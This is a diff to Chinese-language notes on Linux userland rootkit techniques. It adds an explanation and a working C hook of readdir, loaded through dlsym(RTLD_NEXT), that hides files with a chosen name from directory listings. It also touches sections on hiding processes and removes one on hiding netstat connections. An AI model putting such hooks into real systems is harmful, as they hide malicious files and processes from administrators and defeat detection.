@@ -117,15 +117,41 @@ Hello, World!
 文件隐藏
 
 	HOOK open、opendir、readdir等函数， 隐藏特定文件名
+
+
+这段代码hook 了 readdir 函数，并在每次调用时检查当前目录项的名称。如果名称匹配要隐藏的文件（如 "xxx"），则跳过该目录项并继续读取下一个
 	
+```bash
+
+struct dirent *readdir(DIR *dirp) {
+    if (!original_readdir) {
+        original_readdir = (struct dirent* (*)(DIR*)) dlsym(RTLD_NEXT, "readdir");
+    }
+
+    const char *error_msg = dlerror();
+    if (error_msg != NULL) {
+        fprintf(stderr, "dlsym error: %s\n", error_msg);
+        return NULL;
+    }
+
+    struct dirent *entry;
+    while ((entry = original_readdir(dirp)) != NULL) {
+        // 过滤掉你想要隐藏的文件或目录
+        if (strcmp(entry->d_name, "xxx") == 0) {
+            continue;  // 跳过这些文件
+        }
+        return entry;
+    }
+    return NULL;
+}
+
+```	
 	
 
 进程隐藏
 
-	HOOK ps、top等命令相关的函数调用， 通常HOOK readdir、getdents函数来隐藏特定进程
+	HOOK ps、top等命令相关的函数调用， 通常HOOK readdir函数来隐藏特定进程
 	
-
-
 
 这段代码是一个自定义的 readdir 函数，用于过滤特定进程的目录项。主要功能如下：
 
@@ -168,11 +194,6 @@ struct dirent* readdir(DIR *dirp)
 
 
 ```
-
-
-网络连接隐藏
-
-	HOOK netstat命令的相关函数调用， 一般会HOOK readdir/getdents来隐藏特定端口的连接
 
 
 防止被删除
